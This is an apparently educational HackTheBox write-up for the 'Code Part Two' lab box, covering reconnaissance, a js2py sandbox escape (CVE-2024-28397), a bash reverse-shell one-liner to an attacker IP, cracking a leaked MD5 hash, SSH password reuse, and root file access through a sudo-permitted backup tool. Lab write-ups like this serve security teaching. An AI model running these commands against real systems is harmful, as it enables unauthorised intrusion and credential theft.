---
title: Code Part Two Box Write Up (HackTheBox)
date: 2025-12-09 12:00:00 + 0100
tags: [HackTheBox, Educational, Linux, CVE]
categories: [Write Ups]
---

This is an educational write up for the Code Part Two Box on HackTheBox (link [here](https://www.hackthebox.com/machines/codeparttwo)).This is a follow up to Code Part One, which can be found [here](https://www.hackthebox.com/machines/code).

## Reconnaissance

Reconnaissance is the information gathering phase where we discover what services are running on the target. Think of it like casing a building before attempting entry - you need to know where the doors are and how they're protected.

### Rustscan

Let's figure out which ports are open on the target machine by using `rustscan`:

```
sudo rustscan -a 10.10.11.82
```

![Rust Scan](/img/CodePartTwo_Rustscan.png)

**Open ports discovered:**

 - `22`: Secure Shell (SSH) - used for encrypted remote access to the server
 - `8000`: HTTP Web server - likely hosting a website or web application

**What these open ports mean:**

 - Port `22` means we might be able to remotely access the system if we find valid credentials
 - Port `8000` suggests there's a web application we can explore and potentially exploit

### Nmap

Next, let's run focused scan of the two open ports we found with `nmap`:

```
sudo nmap -sV -sC 10.10.11.82 -p22,8000
```

![Nmap Scan](/img/CodePartTwo_Nmapscan.png)

**What is nmap and what do these flags mean?**

**Nmap (Network Mapper)** is a more detailed port scanner that can identify exact software versions and test for common vulnerabilities.

 - `-sV`: **Version detection** - identifies what software and version is running
 - `-sC`: **Run default scripts** - automated checks for common vulnerabilities
 - `-p22,8000`: Only scan these specific ports

**Why is version information critical?:**

Knowing the exact software versions lets us search for known vulnerabilities (CVEs). Older or unpatched software often has published exploits that we can use. It's like knowing which locks on a building have known design flaws that make them easier to pick.

## Web Application Analysis

Let's go check out what's running on port `8000` by navigating to it in a browser:


```
10.10.11.82:8000
```

![Code Part Two Front Page](/img/CodePartTwo_Frontpage.png)

It's a web application that lets you run JavaScript code in your browser. Any application that executes user-provided code is potentially dangerous if not properly secured.

When a web application accepts and executes user code, it's like handing your unlocked phone to a stranger and asking them to "just check the weather." Without proper restrictions (sandboxing), they could read your messages, access your photos, view your banking apps, install malware, or send messages as you.



The application is open source, so let's try downloading the source code:

![Source Code Files](/img/CodePartTwo_Sourcecodefiles.png)

**Why are we analyzing the source code?:**

Having access to the source code is like getting the blueprints to a building. We can see exactly how security is implemented, what assumptions the developers made, and where potential weaknesses might exist. This is much more effective than blind trial-and-error testing.

Inside the `app` directory we see:

 - 6 directories and 11 files
 - A Python script (the main application logic)
 - HTML files (the web interface)
 - A `.db` file (database containing user data)
 - A requirements file (tells us which third-party libraries are used and their versions)

### Source Code

Lets first look at the Python script:

```Python
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)


```

**What is Flask?:**

**Flask** is a Python web framework - essentially a toolkit that makes it easier to build web applications. Instead of handling all the low-level details of HTTP requests and responses, **Flask** provides a simple way to define what happens when users visit different URLs.

**The core functionalities of the script:**

 - User Management:

    - Users can register and login with username/password
    - Passwords are hashed with MD5 before storage
    - Sessions track logged-in users (like keeping a "logged in" cookie)

 - Code Snippet Storage:

    - Logged-in users can save JavaScript code snippets to their account
    - View all their saved snippets on a dashboard
    - Delete snippets they've created

 - JavaScript Execution:

    - The `/run_code` endpoint accepts JavaScript code from users
    - Code is executed server-side using the **js2py** library
    - Results are returned to the user

**What is hashing and why is MD5 weak?:**

Hashing is like putting your password through a one-way scrambler - the result can't be unscrambled back to the original password. MD5 is an old hashing algorithm that's now considered broken because attackers can try billions of passwords per second, "Rainbow Tables" exist (pre-computed lists of MD5 hashes for common passwords) and modern password cracking tools can easily break MD5 hashes

**What can we learn from the script?:**

Normal JavaScript runs in your browser (client-side) in a sandbox that prevents it from accessing your computer's files or running system commands, but this application runs JavaScript on the server using **js2py**, which attempts to create a Python based sandbox. If this sandbox can be escaped, an attacker can execute arbitrary commands on the server itself.

**SQLite3 Database Structure:**

 - Two tables:

    - `user`: stores `id`, `username`, `password_hash`
    - `codesnippet`: stores `id`, `user_id` (foreign key linking to `user`), `code`

### Database File

**What is SQLite?**
SQLite is a simple database that stores everything in a single file - think of it like a sophisticated spreadsheet. Unlike MySQL or PostgreSQL which require a separate database server, SQLite is just a file on disk that applications can read and write to.
Unfortunately, the downloaded database file appears empty. This makes sense - it's probably a template or development copy. The live application on the server will have real user data

By looking at the Python code, we know it's a SQLite database (a lightweight database stored in a single file). We can use the Linux tool `sqlite3` to look inside:

```
sqlite3 users.db
```

![Sqlite3 Database](/img/CodePartTwo_Sqlite3database.png)



Sadly, it seems the database file is empty.

### Requirements File

The `requirements.txt` file looks like this:

```
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

Now we have the version of **j2spy**. Let's Google vulnerabilities associated with this version:

![J2Spy Vulnerabiltiy Search](/img/CodePartTwo_J2Spygoogle.png)

The AI response is useful and explains that **CVE-2024-28397** allows us to escape the sandbox and execute arbitrary commands on the host system. The CVE was found by [Marven11](https://github.com/Marven11).

## Initial Foothold

### The CVE

First let's understand what **j2spy** is:

 - **js2spy** is a popular Python package that evaluates JavaScript code inside a Python interpreter. It's widely used in:
    - Web scrapers to parse JavaScript from websites
    - Applications needing JavaScript execution within Python
    - Download managers

Now let's look at **CVE-2024-28397**:

The vulnerability exists in how js2py handles Python 2 vs Python 3 differences in the `Object.getOwnPropertyNames()` implementation:

```python
def getOwnPropertyNames(obj):
    if not obj.is_object():
        raise MakeError('TypeError', '...')
    return obj.own.keys()  # <--- THE BUG
```
**The problem is:**

 - **Python 2**: `dict.keys()` returns a list -> safely wrapped as PyJs object
 - **Python 3**: `dict.keys()` returns a `dict_keys` view -> wrapped as `PyObjectWrapper` (UNSAFE)

This `PyObjectWrapper` provides direct access to Python's internal object model, bypassing the intended sandbox.

**The Sandbox Bypass**:

Even when developers call `js2py.disable_pyimport()` to prevent JavaScript from importing Python modules, attackers can:

 - Obtain a reference to a raw Python object via `Object.getOwnPropertyNames({})`
 - Navigate through Python's class hierarchy using `__class__`, `__base__`, and `__subclasses__()`
 - Find and execute `subprocess.Popen` to run arbitrary shell commands

### Exploiting CVE-2024-28397

Let's register an account to use the website:

![Logged In Page](/img/CodePartTwo_Loggedin.png)

The POC by Marvin11 was made in Python, but we need a JavaScript POC. Looking again on Google, this can be found on [Github](https://github.com/GhostOverflow/CVE-2024-28397-command-execution-poc/blob/main/payload.js). This is exactly what we're looking for. Let's try running it with the command `whoami`:

![Whoami Command](/img/CodePartTwo_Whoamicommand.png)

Perfect, it works! We're running as the user `app`.

Now let's get a reverse shell using Python. First let's set up a listener in `netcat`:

```
nc -lvnp 4444
```

**What these flags mean:**
 - `-l` - Listen mode (wait for incoming connections)
 - `-v` - Verbose (show connection details)
 - `-n` - No DNS lookup (faster)
 - `-p 4444` - Listen on port 4444

![Netcat Listener](/img/CodePartTwo_Netcatlistener.png)

Now let's trigger the reverse shell by using this command:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.x/4444 0>&1'
```

> Replace the IP and port with your information.

![Initial Foothold](/img/CodePartTwo_InitialFoothold.png)

Success! We now have an initial foothold in the host system with our reverse shell.

Now let's upgrade to a fully interactive shell with `pty`:

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Background the current remote shell (CTRL + Z), update the local terminal line settings with stty2 and bring the remote shell back:

```
stty raw -echo && fg
```

### Investigating The Database

Next, let's look at the database again. This time, since we're in the live website, it will probably have some users stored:

```
cd instance
sqlite3 users.db
```

```SQL
SELECT * FROM user;
```

![SQLite3 Users Database](/img/CodePartTwo_Livedatabase.png)

Perfect! Now we found the password hash of `marco`. We know from looking at the python source code of the app, that it's an MD5 hash. This is a weak form of hashing and we can easily crack this with `hashcat`. 

First copy and paste the hash of `marco` into a file on our attacking pc. Then use `hashcat` to crack it:

```
hashcat -m 0 <HashFileName> /usr/share/wordlists/rockyou.txt
```

![Hashcat Cracking](/img/CodePartTwo_Hashcatcracking.png)

Once done, we can find the cracked password in the potfile located, atleast on my kali machine, in `~/.local/share/hashcat/hashcat.potfile`:

```
cat ~/.local/share/hashcat/hashcat.potfile
```

![Hashcat Potfile](/img/CodePartTwo_Hashcatpotfile.png)

### Lateral Movement to User Account

If Marco reused their password, it's possible we can use the cracked password to SSH as `marco`, so let's try that:

```
ssh marco@10.10.11.82
```

![SSH As Marco](/img/CodePartTwo_SSHasmarco.png)

Perfect! Now we have an SSH connection and can obtain the user flag for this box.


## Privilege Escalation

We're currently `marco`, which has limited permissions. We need to escalate to root to gain access to the root flag.

Running `ls -la` shows:

![ls -la Command](/img/CodePartTwo_Ls-la.png)

The directory `backups` is owned by `root`, and thus not accessible to marco. This means we cannot `cd` into the directory.

Running `id` as `marco` shows we are in the group `backups`:

![Marco ID](/img/CodePartTwo_Marcoid.png)

This is an unusual group and this will probably prove useful later.

### Running LinPEAS

[Linpeas.sh](https://github.com/peass-ng/PEASS-ng) is an automated privilege escalation script that checks for hundreds of potential security weaknesses. It's like having an experienced pentester scan the system for you.

First let's set up a python http server on our attack machine to host the script:

```
cd /path/to/directory/with/linpeas.sh
python -m http.server 8080
```

![Python HTTP Server](/img/CodePartTwo_PythonHTTPServer.png)


Then use `wget` to get the `linpeas.sh` script:

```
cd /tmp
wget 10.10.15.169:8080/linpeas.sh
```

![Wget Linpeas](/img/CodePartTwo_WgetLinpeas.png)


To be able to run it we need to make it an executable:

```
chmod +x linpeas.sh
```

Now we can finally run it with:

```
./linpeas.sh
```

![Linpeas Script](/img/CodePartTwo_Linpeas.png)


### Linpeas Findings

![Linpeas Sudo -l](/img/CodePartTwo_Linpeassudol.png)

Linpeas found that `marco` can run a script called `npbackup-cli` as **sudo**. This is a huge security flaw, as `marco` shouldn't be able to run anything as **sudo**. Searching on Google for `npbackup` I found the project on [Github](https://github.com/netinvent/npbackup):

![NPBackup Github](/img/CodePartTwo_Npbackupgithub.png)

Under the **Usage** section of the **Wiki**, I found how to use the CLI tool:

![Github NPBackup CLI](/img/CodePartTwo_Npbackupcligithub.png)

Let's try doing `npbackup-cli -help`, to see what we can do:

![NPBackup -help](/img/CodePartTwo_Npbackup-help.png)

The config file can be found in `/tmp`:

Let's copy it to a new file and open it with `vim` and then change the target backup directory to `/root`:

```
vim npbackup.conf
```

![Vim NPBackup Config](/img/CodePartTwo_Vimconfig.png)


Now let's run `sudo npbackup-cli --backup` with the new config file:

```
cd /tmp
sudo /usr/local/npbackup-cli -c npbackup.conf --backup
```

![Sudo NPBackup-cli --dump](/img/CodePartTwo_Npbackup.png)

Perfect. Now let's run `--ls` to view the files we just backed up:

```
sudo /usr/local/npbackup-cli -c npbackup.conf --ls
```

![NPBackup --ls](/img/CodePartTwo_Npbackupls.png)

Now we can easily view the root flag by using `--dump`:

```
sudo /usr/local/npbackup-cli -c npbackup.conf --dump /root/root.txt
```

![Root Flag Obtained](/img/CodePartTwo_Rootflag.png)

